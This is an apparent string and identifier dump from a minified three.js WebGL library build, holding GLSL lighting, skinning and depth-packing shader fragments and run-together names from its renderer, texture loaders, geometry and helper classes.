pointSpecularWeight * pointDiffuseWeight * pointDistance * specularNormalization;""	#if MAX_SPOT_LIGHTS > 0""		vec3 spotDiffuse = vec3( 0.0 );""		vec3 spotSpecular = vec3( 0.0 );""		for ( int i = 0; i < MAX_SPOT_LIGHTS; i ++ ) {""			vec4 lPosition = viewMatrix * vec4( spotLightPosition[ i ], 1.0 );""			vec3 spotVector = lPosition.xyz + vViewPosition.xyz;""			float spotDistance = 1.0;""				spotDistance = 1.0 - min( ( length( spotVector ) / spotLightDistance[ i ] ), 1.0 );""			spotVector = normalize( spotVector );""			float spotEffect = dot( spotLightDirection[ i ], normalize( spotLightPosition[ i ] - vWorldPosition ) );""			if ( spotEffect > spotLightAngleCos[ i ] ) {""				spotEffect = max( pow( spotEffect, spotLightExponent[ i ] ), 0.0 );""					float spotDiffuseWeightFull = max( dot( normal, spotVector ), 0.0 );""					float spotDiffuseWeightHalf = max( 0.5 * dot( normal, spotVector ) + 0.5, 0.0 );""					vec3 spotDiffuseWeight = mix( vec3( spotDiffuseWeightFull ), vec3( spotDiffuseWeightHalf ), wrapRGB );""				#else""					float spotDiffuseWeight = max( dot( normal, spotVector ), 0.0 );""				spotDiffuse += spotDistance * spotLightColor[ i ] * diffuse * spotDiffuseWeight * spotEffect;""				vec3 spotHalfVector = normalize( spotVector + viewPosition );""				float spotDotNormalHalf = max( dot( normal, spotHalfVector ), 0.0 );""				float spotSpecularWeight = specularTex.r * max( pow( spotDotNormalHalf, shininess ), 0.0 );""				float specularNormalization = ( shininess + 2.0001 ) / 8.0;""				vec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( spotVector, spotHalfVector ), 5.0 );""				spotSpecular += schlick * spotLightColor[ i ] * spotSpecularWeight * spotDiffuseWeight * spotDistance * specularNormalization * spotEffect;""			}""	#if MAX_DIR_LIGHTS > 0""		vec3 dirDiffuse = vec3( 0.0 );""		vec3 dirSpecular = vec3( 0.0 );""		for( int i = 0; i < MAX_DIR_LIGHTS; i++ ) {""			vec4 lDirection = viewMatrix * vec4( directionalLightDirection[ i ], 0.0 );""			vec3 dirVector = normalize( lDirection.xyz );""				float directionalLightWeightingFull = max( dot( normal, dirVector ), 0.0 );""				float directionalLightWeightingHalf = max( 0.5 * dot( normal, dirVector ) + 0.5, 0.0 );""				vec3 dirDiffuseWeight = mix( vec3( directionalLightWeightingFull ), vec3( directionalLightWeightingHalf ), wrapRGB );""				float dirDiffuseWeight = max( dot( normal, dirVector ), 0.0 );""			dirDiffuse += directionalLightColor[ i ] * diffuse * dirDiffuseWeight;""			vec3 dirHalfVector = normalize( dirVector + viewPosition );""			float dirDotNormalHalf = max( dot( normal, dirHalfVector ), 0.0 );""			float dirSpecularWeight = specularTex.r * max( pow( dirDotNormalHalf, shininess ), 0.0 );""			vec3 schlick = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( dirVector, dirHalfVector ), 5.0 );""			dirSpecular += schlick * directionalLightColor[ i ] * dirSpecularWeight * dirDiffuseWeight * specularNormalization;""	#if MAX_HEMI_LIGHTS > 0""		vec3 hemiDiffuse  = vec3( 0.0 );""		vec3 hemiSpecular = vec3( 0.0 );""		for( int i = 0; i < MAX_HEMI_LIGHTS; i ++ ) {""			vec4 lDirection = viewMatrix * vec4( hemisphereLightDirection[ i ], 0.0 );""			vec3 lVector = normalize( lDirection.xyz );""			float hemiDiffuseWeight = 0.5 * dotProduct + 0.5;""			vec3 hemiColor = mix( hemisphereLightGroundColor[ i ], hemisphereLightSkyColor[ i ], hemiDiffuseWeight );""			hemiDiffuse += diffuse * hemiColor;""			vec3 hemiHalfVectorSky = normalize( lVector + viewPosition );""			float hemiDotNormalHalfSky = 0.5 * dot( normal, hemiHalfVectorSky ) + 0.5;""			float hemiSpecularWeightSky = specularTex.r * max( pow( hemiDotNormalHalfSky, shininess ), 0.0 );""			vec3 lVectorGround = -lVector;""			vec3 hemiHalfVectorGround = normalize( lVectorGround + viewPosition );""			float hemiDotNormalHalfGround = 0.5 * dot( normal, hemiHalfVectorGround ) + 0.5;""			float hemiSpecularWeightGround = specularTex.r * max( pow( hemiDotNormalHalfGround, shininess ), 0.0 );""			float dotProductGround = dot( normal, lVectorGround );""			vec3 schlickSky = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVector, hemiHalfVectorSky ), 5.0 );""			vec3 schlickGround = specular + vec3( 1.0 - specular ) * pow( 1.0 - dot( lVectorGround, hemiHalfVectorGround ), 5.0 );""			hemiSpecular += hemiColor * specularNormalization * ( schlickSky * hemiSpecularWeightSky * max( dotProduct, 0.0 ) + schlickGround * hemiSpecularWeightGround * max( dotProductGround, 0.0 ) );""	vec3 totalDiffuse = vec3( 0.0 );""	vec3 totalSpecular = vec3( 0.0 );""		totalDiffuse += dirDiffuse;""		totalSpecular += dirSpecular;""		totalDiffuse += hemiDiffuse;""		totalSpecular += hemiSpecular;""		totalDiffuse += pointDiffuse;""		totalSpecular += pointSpecular;""		totalDiffuse += spotDiffuse;""		totalSpecular += spotSpecular;""	#ifdef METAL""		gl_FragColor.xyz = gl_FragColor.xyz * ( totalDiffuse + ambientLightColor * ambient + totalSpecular );""		gl_FragColor.xyz = gl_FragColor.xyz * ( totalDiffuse + ambientLightColor * ambient ) + totalSpecular;""	if ( enableReflection ) {""		vec3 vReflect;""			vReflect = refract( cameraToVertex, normal, refractionRatio );""		} else {""			vReflect = reflect( cameraToVertex, normal );""		vec4 cubeColor = textureCube( tCube, vec3( -vReflect.x, vReflect.yz ) );""			cubeColor.xyz *= cubeColor.xyz;""		gl_FragColor.xyz = mix( gl_FragColor.xyz, cubeColor.xyz, specularTex.r * reflectivity );""attribute vec4 tangent;""uniform vec2 uOffset;""uniform vec2 uRepeat;""uniform bool enableDisplacement;""#ifdef VERTEX_TEXTURES""	uniform sampler2D tDisplacement;""	uniform float uDisplacementScale;""	uniform float uDisplacementBias;""		vNormal = normalize( normalMatrix * skinnedNormal.xyz );""		vec4 skinnedTangent = skinMatrix * vec4( tangent.xyz, 0.0 );""		vTangent = normalize( normalMatrix * skinnedTangent.xyz );""		vNormal = normalize( normalMatrix * normal );""		vTangent = normalize( normalMatrix * tangent.xyz );""	vBinormal = normalize( cross( vNormal, vTangent ) * tangent.w );""	vUv = uv * uRepeat + uOffset;""	vec3 displacedPosition;""	#ifdef VERTEX_TEXTURES""		if ( enableDisplacement ) {""			vec3 dv = texture2D( tDisplacement, uv ).xyz;""			float df = uDisplacementScale * dv.x + uDisplacementBias;""			displacedPosition = position + normalize( normal ) * df;""			#ifdef USE_SKINNING""				vec4 skinVertex = vec4( position, 1.0 );""				vec4 skinned  = boneMatX * skinVertex * skinWeight.x;""				skinned 	  += boneMatY * skinVertex * skinWeight.y;""				skinned 	  += boneMatZ * skinVertex * skinWeight.z;""				skinned 	  += boneMatW * skinVertex * skinWeight.w;""				displacedPosition  = skinned.xyz;""				displacedPosition = position;""		#ifdef USE_SKINNING""			vec4 skinVertex = vec4( position, 1.0 );""			vec4 skinned  = boneMatX * skinVertex * skinWeight.x;""			skinned 	  += boneMatY * skinVertex * skinWeight.y;""			skinned 	  += boneMatZ * skinVertex * skinWeight.z;""			skinned 	  += boneMatW * skinVertex * skinWeight.w;""			displacedPosition  = skinned.xyz;""			displacedPosition = position;""	vec4 mvPosition = modelViewMatrix * vec4( displacedPosition, 1.0 );""	vec4 worldPosition = modelMatrix * vec4( displacedPosition, 1.0 );""	#ifdef USE_SHADOWMAP""		for( int i = 0; i < MAX_SHADOWS; i ++ ) {""			vShadowCoord[ i ] = shadowMatrix[ i ] * worldPosition;"'cube'"tFlip""	vec4 worldPosition = modelMatrix * vec4( position, 1.0 );""	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );""uniform float tFlip;""	gl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) );"'depthRGBA'"vec4 pack_depth( const in float depth ) {""	const vec4 bit_shift = vec4( 256.0 * 256.0 * 256.0, 256.0 * 256.0, 256.0, 1.0 );""	const vec4 bit_mask  = vec4( 0.0, 1.0 / 256.0, 1.0 / 256.0, 1.0 / 256.0 );""	vec4 res = mod( depth * bit_shift * vec4( 255 ), vec4( 256 ) ) / vec4( 255 );""	res -= res.xxyz * bit_mask;""	return res;""		gl_FragData[ 0 ] = pack_depth( gl_FragDepthEXT );""		gl_FragData[ 0 ] = pack_depth( gl_FragCoord.z );"WebGLRenderer'THREE.WebGLRenderer'_precision'highp'_buffers_alpha_depth_stencil_antialias_premultipliedAlpha_preserveDrawingBuffer_logarithmicDepthBufferlogarithmicDepthBufferautoClearColorautoClearDepthautoClearStencilautoUpdateObjectsgammaInputgammaOutputshadowMapEnabledshadowMapAutoUpdateshadowMapTypeshadowMapCullFaceshadowMapDebugshadowMapCascademaxMorphTargetsmaxMorphNormalsautoScaleCubemapsrenderPluginsPrerenderPluginsPostprograms_programs_currentProgram_currentFramebuffer_currentMaterialId_currentGeometryGroupHash_currentCamera_usedTextureUnits_oldDoubleSided_oldFlipSided_oldBlending_oldBlendEquation_oldBlendSrc_oldBlendDst_oldDepthTest_oldDepthWrite_oldPolygonOffset_oldPolygonOffsetFactor_oldPolygonOffsetUnits_oldLineWidth_viewportX_viewportY_viewportWidth_viewportHeight_currentWidth_currentHeight_newAttributes_enabledAttributes_projScreenMatrix_projScreenMatrixPS_direction_lightsNeedUpdatedirectionaldistancesspotdirectionsanglesCosexponentshemiskyColorsgroundColors_gl_glExtensionTextureFloat_glExtensionTextureFloatLinear_glExtensionStandardDerivatives_glExtensionTextureFilterAnisotropic_glExtensionCompressedTextureS3TC_glExtensionElementIndexUint_glExtensionFragDepthinitGLsetDefaultGLState_maxTextures_maxVertexTextures_maxTextureSize_maxCubemapSize_maxAnisotropy_supportsVertexTextures_supportsBoneTextures_compressedTextureFormats_vertexShaderPrecisionHighpFloat_vertexShaderPrecisionMediumpFloat_vertexShaderPrecisionLowpFloat_fragmentShaderPrecisionHighpFloat_fragmentShaderPrecisionMediumpFloat_fragmentShaderPrecisionLowpFloathighpAvailablemediumpAvailable"highp""mediump""WebGLRenderer: highp not supported, using mediump""lowp""WebGLRenderer: highp and mediump not supported, using lowp""WebGLRenderer: mediump not supported, using lowp"supportsFloatTexturessupportsStandardDerivativessupportsCompressedTextureS3TCgetPrecisionbitsclearTargetsetRenderTargetaddPostPluginpluginaddPrePluginupdateShadowMapshadowMapPlugincreateParticleBuffers__webglVertexBuffer__webglColorBuffercreateLineBuffers__webglLineDistanceBuffercreateMeshBuffersgeometryGroup__webglNormalBuffer__webglTangentBuffer__webglUVBuffer__webglUV2Buffer__webglSkinIndicesBuffer__webglSkinWeightsBuffer__webglFaceBuffer__webglLineBuffer__webglMorphTargetsBuffers__webglMorphNormalsBuffersonGeometryDisposedeallocateGeometryonTextureDisposedeallocateTextureonRenderTargetDisposedeallocateRenderTargetonMaterialDisposedeallocateMaterialdeleteBuffers__webglCustomAttributesList__webglInit__webglTextureCube__webglTextureWebGLRenderTargetCube__webglFramebuffer__webglRenderbufferprogramInfousedTimesnewProgramsinitCustomAttributesnvertices__webglInitializedcreateUniqueBuffersbelongsToAttributeinitParticleBuffers__vertexArray__colorArray__sortArray__webglParticleCountinitLineBuffers__lineDistanceArray__webglLineCountinitMeshBuffersntrisnlinesgetBufferMaterialuvTypebufferGuessUVTypenormalTypebufferGuessNormalTypevertexColorTypebufferGuessVertexColorType__normalArray__tangentArray__uvArray__uv2Array__skinIndexArray__skinWeightArrayUintArray21845__typeArray__faceArray__lineArray__morphTargetsArrays__morphNormalsArrays__webglFaceCountoriginalAttribute__original__inittedArraysmaterialNeedsSmoothNormalsinitDirectBuffersbufferTypesetParticleBuffersvertexArraycolorArraysortArraydirtyVerticesdirtyElementsdirtyColorscustomAttributescalcustomAttributenumericalSortboundTo"vertices"setLineBuffersdllineDistanceArraydirtyLineDistancessetMeshBuffersneedsSmoothNormalsfaceColorv4t4n1n3n4c4sw1sw2sw3sw4si1si2si3si4sa1sa2sa3sa4sb1sb2sb3sb4vnuviuv2ivkvklvkankachfoffset_uvoffset_uv2offset_faceoffset_normaloffset_tangentoffset_lineoffset_coloroffset_skinoffset_morphTargetoffset_customoffset_customSrcuvArrayuv2ArraynormalArraytangentArrayskinIndexArrayskinWeightArraymorphTargetsArraysmorphNormalsArraysfaceArraylineArraydirtyUvsdirtyNormalsdirtyTangentsdirtyMorphTargetsmorphTargetsNeedUpdatechunk_faces3obj_facesobj_uvsobj_uvs2obj_colorsobj_skinIndicesobj_skinWeights"faces"pp"r""g""b""x""y""z""faceVertices"setDirectBuffersattributeItemrenderBufferImmediateinitAttributeshasPositionshasNormalshasUvs__webglUvBufferhasColorspositionArrayenableAttributenxnynznaxnbxncxnaynbyncynaznbznczdisableUnusedAttributessetupVertexAttributesprogramAttributesgeometryAttributesstartIndexattributePointerattributeSizerenderBufferDirectsetProgramupdateBufferswireframeBitgeometryHashrenderBuffergeometryGroupHashsetupMorphTargetstangentskinIndexskinWeightlineDistanceinfluencesnumSupportedMorphTargets"morphTarget""morphNormal"__webglMorphTargetInfluencesactiveInfluenceIndicesnumSupportedMorphNormalsinfluenceIndexpainterSortStableforceClear'THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.'webglObjectinitWebGLObjectsrenderPlugins__webglObjectssetupMatricesunrollBufferMaterial__webglObjectsImmediateunrollImmediateBufferMaterialsetDepthTestsetDepthWritesetPolygonOffsetrenderObjectsrenderObjectsImmediate"opaque""transparent"updateRenderTargetMipmapmaterialTypeuseBlendingsetMaterialFacesrenderImmediateObjectimmediateRenderCallbackglobjectopaque__webglSprites__webglFlaresaddObjectremoveObject__webglActiveupdateObject_modelViewMatrix4294967296addBufferImmediateRenderObjectaddBufferImmediateLensFlareobjlistcustomAttributesDirtyareCustomAttributesDirtyclearCustomAttributesremoveInstancesremoveInstancesDirectinitMaterialidentifiersmaxLightCountmaxBonesmaxShadowsshaderIDsetMaterialShadersallocateLightsallocateShadowsallocateBonesuseFogfogExpmaxDirLightsmaxPointLightsmaxSpotLightsmaxHemiLightspluniformsListshadersrefreshMaterialp_uniformsm_uniformslogDepthBufFCtextureUnitgetTextureUnitsetTextureboneGlobalMatricesrefreshUniformsFogsetupLightsrefreshUniformsLightsrefreshUniformsCommonrefreshUniformsLinerefreshUniformsDashrefreshUniformsParticlerefreshUniformsPhongrefreshUniformsLambertmNearmFar_shadowPassrefreshUniformsShadowloadUniformsGenericcameraPositionviewMatrixloadUniformsMatricesmodelMatrixuvScaleMapoffsetRepeatflipEnvMapuseRefracttotalSizepsColorfogColorfogNearfogFarfogDensityambientLightColordirectionalLightColordirectionalLightDirectionpointLightColorpointLightPositionpointLightDistancespotLightColorspotLightPositionspotLightDistancespotLightDirectionspotLightAngleCosspotLightExponenthemisphereLightSkyColorhemisphereLightGroundColorhemisphereLightDirectionmodelViewMatrix"WebGLRenderer: trying to use "" texture units while this GPU supports only "uniform"iv1""iv"_array"v3v""v4v""m3""m3v""m4"setCubeTexturesetCubeTextureDynamic'THREE.WebGLRenderer: Unknown uniform type: 'setColorGammaintensitySqsetColorLinearzlightsdirColorsdirPositionspointColorspointPositionspointDistancesspotColorsspotPositionsspotDistancesspotDirectionsspotAnglesCosspotExponentshemiSkyColorshemiGroundColorshemiPositionsdirLengthpointLengthspotLengthhemiLengthdirCountpointCountspotCounthemiCountdirOffsetpointOffsetspotOffsethemiOffsetfrontFaceDirectionpolygonoffsetparamThreeToGLsetTextureParameterstextureTypeisImagePowerOfTwofilterFallback__oldAnisotropyslotglFormatglTypemipmapclampToMaxSizemaxDimensionnewWidthnewHeightctx"2d"cubeImagesetupFrameBuffertextureTargetsetupRenderBufferdepthBufferisCubeisTargetPowerOfTwoshareDepthFromvyactiveCubeFacenVertexUniformsnVertexMatrices"WebGLRenderer: too many bones - "", this GPU supports just "" (try OpenGL instead of ANGLE)"dirLightspointLightsspotLightshemiLights'directional''point''spot''hemi''webgl''experimental-webgl''Error creating WebGL context.''OES_texture_float''OES_texture_float_linear''OES_standard_derivatives''EXT_texture_filter_anisotropic''MOZ_EXT_texture_filter_anisotropic''WEBKIT_EXT_texture_filter_anisotropic''WEBGL_compressed_texture_s3tc''MOZ_WEBGL_compressed_texture_s3tc''WEBKIT_WEBGL_compressed_texture_s3tc''OES_element_index_uint''THREE.WebGLRenderer: Float textures not supported.''THREE.WebGLRenderer: Standard derivatives not supported.''THREE.WebGLRenderer: Anisotropic texture filtering not supported.''THREE.WebGLRenderer: S3TC compressed textures not supported.''THREE.WebGLRenderer: elementindex as unsigned integer not supported.'"rangeMin""rangeMax""precision"'EXT_frag_depth'ShadowMapPluginSpritePluginLensFlarePluginprogramIdCountgenerateDefines"#define "" "cacheUniformLocationsglcacheAttributeLocationsshadowMapTypeDefine"SHADOWMAP_TYPE_BASIC""SHADOWMAP_TYPE_PCF""SHADOWMAP_TYPE_PCF_SOFT"customDefinesprefix_vertexprefix_fragment"precision "" float;"" int;""#define VERTEX_TEXTURES""#define GAMMA_INPUT""#define GAMMA_OUTPUT""#define MAX_DIR_LIGHTS ""#define MAX_POINT_LIGHTS ""#define MAX_SPOT_LIGHTS ""#define MAX_HEMI_LIGHTS ""#define MAX_SHADOWS ""#define MAX_BONES ""#define USE_MAP""#define USE_ENVMAP""#define USE_LIGHTMAP""#define USE_BUMPMAP""#define USE_NORMALMAP""#define USE_SPECULARMAP""#define USE_COLOR""#define USE_SKINNING""#define BONE_TEXTURE""#define USE_MORPHTARGETS""#define USE_MORPHNORMALS""#define WRAP_AROUND""#define DOUBLE_SIDED""#define FLIP_SIDED""#define USE_SHADOWMAP""#define SHADOWMAP_DEBUG""#define SHADOWMAP_CASCADE""#define USE_SIZEATTENUATION""#define USE_LOGDEPTHBUF""uniform mat4 modelMatrix;""uniform mat4 modelViewMatrix;""uniform mat4 projectionMatrix;""uniform mat4 viewMatrix;""uniform mat3 normalMatrix;""uniform vec3 cameraPosition;""attribute vec3 position;""attribute vec3 normal;""attribute vec2 uv;""attribute vec2 uv2;""	attribute vec3 color;""	attribute vec3 morphTarget0;""	attribute vec3 morphTarget1;""	attribute vec3 morphTarget2;""	attribute vec3 morphTarget3;""		attribute vec3 morphNormal0;""		attribute vec3 morphNormal1;""		attribute vec3 morphNormal2;""		attribute vec3 morphNormal3;""		attribute vec3 morphTarget4;""		attribute vec3 morphTarget5;""		attribute vec3 morphTarget6;""		attribute vec3 morphTarget7;""	attribute vec4 skinIndex;""	attribute vec4 skinWeight;""#extension GL_OES_standard_derivatives : enable""#define ALPHATEST ""#define USE_FOG""#define FOG_EXP2""#define METAL"glVertexShaderglFragmentShader'Could not initialise shader''gl.VALIDATE_STATUS''gl.getError()''gl.getProgramInfoLog()''viewMatrix''modelViewMatrix''projectionMatrix''normalMatrix''modelMatrix''cameraPosition''morphTargetInfluences''boneTexture''boneTextureWidth''boneTextureHeight''boneGlobalMatrices''logDepthBufFC'"skinIndex""skinWeight""lineDistance"addLineNumbers': ''THREE.WebGLShader: Shader couldn\'t compile.''THREE.WebGLShader:''gl.getShaderInfoLog()'GeometryUtilsgeometry1geometry2'DEPRECATED: GeometryUtils\'s .merge() has been moved to Geometry. Use geometry.merge( geometry2, matrix, materialIndexOffset ) instead.'randomPointInTrianglevectorAvectorBvectorCrandomPointInFaceuseCachedAreasrandomPointsInGeometrytotalAreacumulativeAreas_areatriangleAreabinarySearchIndicesbinarySearchvector1vector2ddsparseDDS"arraybuffer"loadCountgenerateCubeFaceCallbackrqisCubemapmipmapCountloadDDSTextureloadMipmapsDDS_MAGIC0x20534444DDSD_CAPS0x1DDSD_HEIGHT0x2DDSD_WIDTH0x4DDSD_PITCHDDSD_PIXELFORMAT0x1000DDSD_MIPMAPCOUNT0x20000DDSD_LINEARSIZE0x80000DDSD_DEPTHDDSCAPS_COMPLEXDDSCAPS_MIPMAP0x400000DDSCAPS_TEXTUREDDSCAPS2_CUBEMAP0x200DDSCAPS2_CUBEMAP_POSITIVEX0x400DDSCAPS2_CUBEMAP_NEGATIVEX0x800DDSCAPS2_CUBEMAP_POSITIVEYDDSCAPS2_CUBEMAP_NEGATIVEY0x2000DDSCAPS2_CUBEMAP_POSITIVEZ0x4000DDSCAPS2_CUBEMAP_NEGATIVEZ0x8000DDSCAPS2_VOLUME0x200000DDPF_ALPHAPIXELSDDPF_ALPHADDPF_FOURCCDDPF_RGB0x40DDPF_YUVDDPF_LUMINANCEfourCCToInt32int32ToFourCC0xffloadARGBMipdataOffsetdataLengthsrcBufferbyteArrayFOURCC_DXT1"DXT1"FOURCC_DXT3"DXT3"FOURCC_DXT5"DXT5"headerLengthInt31off_magicoff_sizeoff_flagsoff_heightoff_widthoff_mipmapCountoff_pfFlagsoff_pfFourCCoff_RGBBitCountoff_RBitMaskoff_GBitMaskoff_BBitMaskoff_ABitMaskoff_caps27off_caps2off_caps329off_caps4"ImageUtils.parseDDS(): Invalid magic number in DDS header""ImageUtils.parseDDS(): Unsupported format, must contain a FourCC code"blockBytesfourCCisRGBAUncompressed0xff00000xff000xff000000"ImageUtils.parseDDS(): Unsupported FourCC code: ""data""width""height"getNormalMapsubtractimageDatalyuylxuxnum_pointsgenerateDataTextureSceneUtilscreateMultiMaterialObjectattachFontUtils"helvetiker"divisionsgetFaceloadFacefamilyNameThreeFontcssFontWeightcssFontStyledrawTextcharacterPtsallPtsresolutionfontPathsPathretextractGlyphPointsptscpx0cpy0cpx1cpy1cpx2cpy2lasteglyphglyphs_cachedOutline'm''l''q'ShapeUtilsb3hagenerateShapescurveSegmentsshapestoShapes0.0000000001contourvertsvertIndicesnv"Warning, unable to triangulate polygon!"snippxpyaXaYbXbYcXcYapxapybpxbpycCROSSapbCROSScpaCROSSbpTriangulate_typeface_jstypeface_jsCurve"Warning, getPoint() not implemented!"getPointAtgetUtoTmappinggetPointsgetSpacedPointslengthsgetLengths__arcLengthDivisionscacheArcLengthssumupdateArcLengthsarcLengthstargetArcLengthcomparisonlengthBeforelengthAftersegmentLengthsegmentFractiongetTangentpt1pt2vecgetTangentAttangentQuadraticBeziertangentCubicBeziertangentSplineh00h10h01h11getPointFuncCurvePathcurvesbendscurvecheckConnectionstartPointendPointLineCurvecurveLengthsgetCurveLengthslenscacheLengthssumsmaxXmaxYmaxZminXminYminZcreatePointsGeometrycreateGeometrycreateSpacedPointsGeometryaddWrapPathbendpathgetTransformedPointsoldPtsgetWrapPointsgetTransformedSpacedPointsboundsoldXoldYxNormpathPtGyroscopetranslationWorldquaternionWorldscaleWorldtranslationObjectquaternionObjectscaleObjectfromPointsPathActionsMOVE_TO'moveTo'LINE_TO'lineTo'QUADRATIC_CURVE_TO'quadraticCurveTo'BEZIER_CURVE_TO'bezierCurveTo'CSPLINE_THRU'splineThru'ARC'arc'ELLIPSE'ellipse'vectorsvlenlastargsaCPxaCPyQuadraticBezierCurveaCP1xaCP1yaCP2xaCP2yCubicBezierCurvesplineThrunptsSplineCurveaRadiusaStartAngleaEndAngleaClockwiseabsarcabsellipsexRadiusyRadiusEllipseCurvelastPointclosedPathuseSpacedPoints'tata'sptssplinedeltaAngletdivisionsisCCWnoHolesextractSubpathsinActionssubPathslastPathtoShapesNoHolesinSubpathstmpPathtmpShapeisPointInsidePolygoninPtinPolygonpolyLeninsideedgeLowPtedgeHighPtedgeDxedgeDyperpEdgesolidholesFirstisClockWisebetterShapeHolesnewShapesnewShapeHolesmainIdxtmpPointsambigioustoChangesIdxsLenshohIdxhohole_unassigneds2IdxfromstosholetmpHolesholesextrudeextrudedExtrudeGeometrymakeGeometryShapeGeometrygetPointsHolesholesPtsgetSpacedPointsHolesextractAllPointsextractPointsextractAllSpacedPointstriangulateShapepoint_in_segment_2D_colininSegPt1inSegPt2inOtherPtintersect_segments_2DinSeg1Pt1inSeg1Pt2inSeg2Pt1inSeg2Pt2inExcludeAdjacentSegsseg1dxseg1dyseg2dxseg2dyseg1seg2dxseg1seg2dylimitperpSeg1perpSeg2factorSeg1seg1Ptseg2Ptseg1minseg1maxseg1minValseg1maxValseg2minseg2maxseg2minValseg2maxValisPointInsideAngleinVertexinLegFromPtinLegToPtlegFromPtXlegFromPtYlegToPtXlegToPtYotherPtXotherPtYfrom2toAnglefrom2otherAngleother2toAngleremoveHolesisCutLineInsideAnglesinShapeIdxinHoleIdxlastShapeIdxprevShapeIdxnextShapeIdxinsideAnglelastHoleIdxprevHoleIdxnextHoleIdxintersectsShapeEdgeinShapePtinHolePtnextIdxintersection%=indepHolesintersectsHoleEdgeihIdxchkHoleholeIndexshapeIndexshapePtholePtholeIdxcutKeyfailedCutstmpShape1tmpShape2tmpHole1tmpHole2hlminShapeIndex"Infinite Loop! Holes left:"", Probably Hole outside Shape!"":"allPointsMapallpoints"Duplicate point"shapeWithoutHolestrianglesb2p0b2p1b2p2b3p0b3p1b3p2b3p3ArcCurveLineCurve3QuadraticBezierCurve3CubicBezierCurve3SplineCurve3pt0pt3ClosedSplineCurve3AnimationHandlerplayingthatdeltaTimeMSaddToUpdateremoveFromUpdate"THREE.AnimationHandler.add: Warning! "" already exists in library. Overwriting."initData" doesn't exists in library. Doing nothing."hierarchyparseRecurseHierarchyinitializedusedMorphTargetsmorphTargetNamemorphTargetsInfluencesCATMULLROMCATMULLROM_FORWARDAnimationtimeScaleisPlayingisPausedinterpolationTypekeyTypes"pos""rot""scl"animationCacheprevKeynextKeyoriginalMatrixgetNextKeyWithnewVectornewQuatinterpolateCatmullRomprevXYZnextXYZproportionalWeightgetPrevKeyWith0.33currentPointforwardPoint1.01KeyFrameAnimationsidssidhasTargetMorphAnimationmeshlastFramecurrentFrameinterpolationCubeCameracubeResolution90cameraPXcameraNXcameraPYcameraNYcameraPZcameraNZupdateCubeMapCombinedCameraorthoNearorthoFarcameraOcameraPtoPerspectiveinPerspectiveModeinOrthographicModetoOrthographichyperfocushalfHeightplaneHeightplaneWidthhalfWidthsetFovsetZoomtoFrontViewtoBackViewtoLeftViewtoRightViewtoTopViewtoBottomViewwidth_halfheight_halfdepth_halfbuildPlane'z''y''x'udirvdirgridXgridYgridX1gridY1segment_widthsegment_heightuvauvbuvcuvdcenterUVsegmentCubeGeometry'DEPRECATED: THREE.CubeGeometry is deprecated. Use THREE.BoxGeometry instead.'heightHalfverticesRowuvsRowtanThetananbuv4"undefined"shapebbaddShapeListaddShapebevelThicknessbevelSizebevelSegmentsbevelEnabledextrudePathextrudePtsextrudeByPathextrudeMaterialuvgenUVGeneratorWorldUVGeneratorsplineTubebinormalposition2TubeGeometryFrenetFramesaholebevelPointsshapesOffsetshapePointsscalePt2pt"die"bsvertflencontclenRAD_TO_DEGREESgetBevelVecinPrevinNextv_trans_xv_trans_yshrink_byv_prev_xv_prev_yv_next_xv_next_yv_prev_lensqcolinear0v_prev_lenv_next_lenptPrevShift_xptPrevShift_yptNextShift_xptNextShift_ysfv_trans_lensqdirection_eqcontourMovementspt_ipt_jpt_kholesMovementsoneHoleMovementsverticesMovementsbinormalsbuildLidFacesbuildSideFaceslayerf3layeroffsetsidewallsslen1slen2f4isBottomgenerateBottomUVgenerateTopUVwallContourstepIndexstepsLengthcontourIndex1contourIndex2generateSideWallUVextrudedShapeextrudeOptionsindexAindexBindexCindexDcz__v1__v2__v3__v4__v5__v6LatheGeometryinversePointLengthinverseSegmentsnpgridZgridZ1RingGeometryinnerRadiusouterRadiusthetaSegmentsphiSegmentsradiusStepthetaSegmentTextGeometrytextShapestangbitangetPosjpin_qin_pcusuquOverPcsnumpointspos2smallestinitialNormal3initialNormal1lastBinormalinitialNormal2PolyhedronGeometrymidpointscentroidsubdivide0.2inclinationmakeazicorrectUVajbjOctahedronGeometryTetrahedronGeometryParametricGeometryslicesstacksstackCountsliceCountAxisHelper0x00ff000xaaff000x0000ff0x00aaffArrowHelperheadLengthheadWidth0xffff00lineGeometryconeGeometryconesetColorBoxHelperBoundingBoxHelper0x888888CameraHelperpointMaphexFrustumhexConehexUphexTargethexCross0x333333"n1""n2""n4""n3""f1""f2""f4""f3""p""u1""u2""u3""cn1""cn2""cn3""cn4""cf1""cf2""cf3""cf4"projectorsetPoint1.1DirectionalLightHelperlightPlanetargetLineEdgesHelperedgesortFunctionnumEdgesvert1vert2face1face20.9999FaceNormalsHelperobjectVerticesobjectFacesobjectWorldMatrixGridHelper0x444444setColorscolorCenterLinecolorGridHemisphereLightHelpersphereSizearrowLengthdomeSizelightSpherePointLightHelperSkeletonHelperSpotLightHelperconeLengthconeWidthVertexNormalsHelperworldMatrixvertexIdVertexTangentsHelperWireframeHelperedgesindex2numTrisindex1renderCallbacklensFlarescustomUpdateCallbackupdateLensFlaresflarevecXvecYwantedRotationMorphBlendMeshanimationsMapanimationsListnumFrames"__default"startFrameendFramecreateAnimationsetAnimationWeightautoCreateAnimations/([a-z]+)(\d+)/frameRangessetAnimationDirectionForwardsetAnimationDirectionBackwardsetAnimationFPSsetAnimationDurationsetAnimationTimegetAnimationTimegetAnimationDurationstopAnimation_renderer_lensFlarevertexBufferelementBuffertempTextureocclusionTexturehasVertexTextureShaderFlares"lensFlare""lensFlareVertexTexture"renderType"renderType"occlusionMap"occlusionMap"screenPosition"screenPosition"flaresnFlarestempPositioninvAspecthalfViewportWidthhalfViewportHeightscreenPositionPixels" float;\n"_depthMaterial_depthMaterialMorph_depthMaterialSkin_depthMaterialMorphSkin_min_max_matrixPositiondepthShader"depthRGBA"depthUniformsvirtualLightcreateVirtualLightoriginalCameragyro"Created virtualLight"updateVirtualLightshadowFilterpars"Unsupported light type for 